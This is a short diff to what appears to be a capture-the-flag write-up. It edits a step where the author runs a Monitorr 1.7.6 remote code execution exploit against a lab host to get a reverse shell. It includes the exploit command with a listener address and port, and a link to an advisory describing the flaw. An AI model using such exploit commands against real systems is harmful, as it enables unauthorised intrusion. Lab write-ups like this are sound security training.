@@ -72,7 +72,7 @@ Alright now that we've got our exploit, let's run it and try get a reverse shell
 ```
 python3 exploit.py https://monitorr.robyns-petshop.thm/ 10.9.15.124 4444
 ```
-and we get nothing. When we navigate to the directory listed [here](https://lyhinslab.org/index.php/2020/09/12/how-the-white-box-hacking-works-authorization-bypass-and-remote-code-execution-in-monitorr-1-7-6/). This had me stumped for a while so I decided  to take a look at the upload.php to see what errors there were:  
+and we get nothing. When we navigate to the directory listed [here](https://lyhinslab.org/index.php/2020/09/12/how-the-white-box-hacking-works-authorization-bypass-and-remote-code-execution-in-monitorr-1-7-6/), our shell isn't uploaded. This had me stumped for a while so I decided  to take a look at the upload.php to see what errors there were:  
 ![image](https://user-images.githubusercontent.com/65077960/125064720-d9e93900-e0a8-11eb-83c7-900be503fd95.png)
 
 ### User own
